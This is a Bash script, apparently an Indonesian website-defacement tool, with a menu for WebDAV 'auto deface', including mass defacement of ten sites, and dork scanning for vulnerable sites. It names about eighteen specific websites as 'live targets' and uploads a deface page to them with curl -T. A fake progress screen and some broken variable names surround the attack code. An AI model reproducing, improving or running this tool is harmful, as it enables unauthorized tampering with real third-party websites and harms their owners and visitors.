#MISTER FUKURO
#Gila_coding
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
bash jr.sh
echo
clear
echo  $red
echo 'Memuat......';
sleep 2.0;
clear
echo  $red
echo 'sabar ya...####... Prosses Sedang Berjalan.. ###...';
sleep 3.0;
clear
echo  $red
echo 'dela maning.............................';
sleep 2.0;
echo  $green
echo "Processing 50%";
sleep 1.0;
clear
echo  $red
echo  'Dela banget lah...............';
sleep 2.0;
echo  $green
echo 'Processing 80%...';
sleep 1.0;
clear
echo  $red
echo 'Loading.........88%.......................';
sleep 1.0;
echo  $green
echo 'sabar tai...Dela maning lah...';
sleep 2.0;
echo  $red
echo "Loading..............91%.......................";
sleep 1.0;
clear
echo  $red
echo 'Wong sabar di sayang tuhan...96%... ';
sleep 1.0;
clear
echo  $red
echo 'Prossesing 98%........................';
sleep 0.9;
clear
echo  $green
echo 'Loading Memuat Project..............................';
sleep 2.3;
clear
echo  $red
echo 'Prossesing 99%';
sleep 1.0;
clear
echo  $green
echo "Loading....................................";
sleep 0.7;
clear
echo  $red
echo "Sedang Memulai Project.....................";
sleep 1.0;
clear
echo  $green
echo '100%................';
sleep 0.9;
clear
echo  $green
echo 'Sukses! .................................';
sleep 0.9;
clear
echo  $red
echo 'Nah kaya kue Sabar........................';
sleep 1.0;
clear
echo  $red
echo  "AWOKAWOKAWOK";
sleep 0.5;
clear
echo  $green
echo "############START################";
sleep 0.1;
clear
echo
echo
echo
echo
echo
echo
echo
toilet -f future "  TOOLS BIASA BAE " | lolcat
echo
echo $red"#####################$green" WAGU YA ORA PAPA "$red######################"
echo $yellow
figlet -f future " MR D4PLU17 BERAKSI "
echo
echo $red"########################$green" JANCUK "$red###########################"
echo
echo $indigo"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Tebas Index"$cyan
echo $indigo"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Scaning Dork Web Vuln"$cyan
echo $indigo"	~"$cyan"{"$white"C"$cyan"}"$green"."$yellow"Auto Deface / Webdav"$cyan
echo
echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
echo
echo $indigo"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"LIVE TARGET"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
echo $indigo"=============================================================="
echo
echo $white "╭─"$yellow"Anonymous Indonesia"$cyan" ~Manusiaajaib"$white
read -p " ╰─$ "  wedus
echo
if [ $wedus = "A" ] || [ $wedus = "a" ]
then
echo
echo
echo
clear
echo
echo
echo
echo
toilet -f future "Deface Tebas Index" | lolcat
echo
echo $red "Simpan SC Di Memory Internal Di Luar Folder "
echo
echo $yellow "Live Target"
echo $white "http://contsol.co.za"
echo $cyan "http://colourfactory.co.za"
echo $white "http://chillibitez.co.za"
echo $cyan "http://chasingfantasia.com"
echo $white "http://centraltech.co.za"
echo $cyan "http://cblandscapes.co.za"
echo $white "http://crimsonmonkeyweb.com"
echo $cyan "http://kevinbutho.com"
echo $white "http://prorepafrica.com"
echo $cyan "http://xposurephotography.co.za"
echo $white "http://windmillsandporcupines.co.za"
echo $cyan "http://tcnig.co.za"
echo $white "http://techdirect.co.za"
echo $cyan"http://thehellenic.co.za"
echo $white "http://valdicare.co.za"
echo $cyan"http://bitsandpieces.co.za"
echo $white "http://scnc.co.za"
echo $cyan "http://ayk.co.za"
echo
echo
echo $red "Masukkan Web Target!!!"
echo $green "╭─"$blue"sikat gasken"$cyan" ~MR D4PLU17"$white
read -p " ╰─$ "  target
echo
echo $red "Masukan Script!!! "
echo $green "╭─"$blue"sikat gasken"$cyan" ~/Nama SC Kalian ya harus (index.html) "$white
read -p " ╰─$ "  script
curl -T /storage/emulated/0/$script $target
echo $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "B" ] || [ $apaan = "b" ]
then
python2 B-DORK.py
echo 
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "C" ] || [ $apaan = "c" ]
then
echo
echo
echo
clear
echo
echo
echo
echo $red
toilet -f future "Auto Deface 10" | lolcat
echo $cyan "Deface Masal Sebanyak 10 Web"
echo
echo $red"###"$blue" Ctrl + C To Quit"$red" ###"
echo
echo
echo
echo "Masukan Script !!!!"
echo $white "╭─"$green"Mister Black Cyber"$cyan" ~MR D4PLU17"$white                               
read -p " ╰─$ " script
echo
echo
echo $white"Masukan Target1 !!!!"
echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR D4PLU17"$white                               
read -p " ╰─$ " target1
curl -T /storage/emulated/0/$script $target1
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target1/$script"
echo
echo $white"Masukan Target2 !!!!"
echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR D4PLU17"$white                               
read -p " ╰─$ " target2
curl -T /storage/emulated/0/$script $target2
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target2/$script"
echo
echo $white"Masukan Target3 !!!!"
echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR D4PLU17"$white                               
read -p " ╰─$ " target3
curl -T /storage/emulated/0/$script $target3
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target3/$script"
echo
echo $white"Masukan Target4 !!!!"
echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR D4PLU17"$white                               
read -p " ╰─$ " target4
curl -T /storage/emulated/0/$script $target4
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target4/$script"
echo
echo $white"Masukan Target5 !!!!"
echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR D4PLU17"$white                               
read -p " ╰─$ " target5
curl -T /storage/emulated/0/$script $target5
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target5/$script"
echo
echo $white"Masukan Target6 !!!!"
echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR D4PLU17"$white                               
read -p " ╰─$ " target6
curl -T /storage/emulated/0/$script $target6
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6/$script"
echo
echo $white"Masukan Target7 !!!!"
echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR D4PLU17"$white                               
read -p " ╰─$ " target7
curl -T /storage/emulated/0/$script $target7
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target7/$script"
echo
echo $white"Masukan Target8 !!!!"
echo $white "╭─"$green"Mister Black Cyber"$cyan" ~BlackCyberAnonim"$white                               
read -p " ╰─$ " target8
curl -T /storage/emulated/0/$script $target8
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target8/$script"
echo
echo $white"Masukan Target9 !!!!"
echo $white "╭─"$green"Mister Black Cyber"$cyan" ~BlackCyberAnonim"$white                               
read -p " ╰─$ " target9
curl -T /storage/emulated/0/$script $target9
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target9/$script"
echo
echo $white"Masukan Target10 !!!! "
echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR D4PLU17"$white                               
read -p " ╰─$ " target10
curl -T /storage/emulated/0/$script $target10
echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target10/$script"
echo
echo
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "I" ] || [ $apaan = "i" ]
then
echo
echo
toilet -f future "   Informasi Tools" | lolcat
echo $red"##########################$green" WELCOME "$red###########################"
echo $green"Author  : MR D4PLU17	"
echo
echo $yellow"                          THANKS TO :"
echo
echo $cyan"> MR D4PLU17 "
echo $cyan"> All MEMBER ICES "
echo $cyan"> MR CA0 "
echo $red"##########################$green" WELCOME "$red###########################"
echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] " back
fi

if [ $apaan = "T" ] || [ $apaan = "t" ]
then
echo
echo
echo
echo
toilet -f future " Live Target" | lolcat
echo $red"##########################$green" WELCOME "$red###########################"
echo $white "http://contsol.co.za"
echo $cyan "http://colourfactory.co.za"
echo $white "http://chillibitez.co.za"
echo $cyan "http://chasingfantasia.com"
echo $white "http://centraltech.co.za"
echo $cyan "http://cblandscapes.co.za"
echo $white "http://crimsonmonkeyweb.com"
echo $cyan "http://kevinbutho.com"
echo $white "http://prorepafrica.com"
echo $cyan "http://xposurephotography.co.za"
echo $white "http://windmillsandporcupines.co.za"
echo $cyan "http://tcnig.co.za"
echo $white "http://techdirect.co.za"
echo $cyan"http://thehellenic.co.za"
echo $white "http://valdicare.co.za"
echo $cyan"http://bitsandpieces.co.za"
echo $white "http://scnc.co.za"
echo $cyan "http://ayk.co.za"
echo $red"##########################$green" WELCOME "$red###########################"
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] " back
fi

if [ $apaan = "Q" ] || [ $apaan = "q" ]
then
echo $green " Thanks Ya, Jangan Lupa Balik Lagi :) "
exit
clear
fi


if [ $back = "B" ] || [ $back = "b" ]
then
sh BCA.sh
fi

if [ $back = "Q" ] || [ $back = "q" ]
then
clear
fi
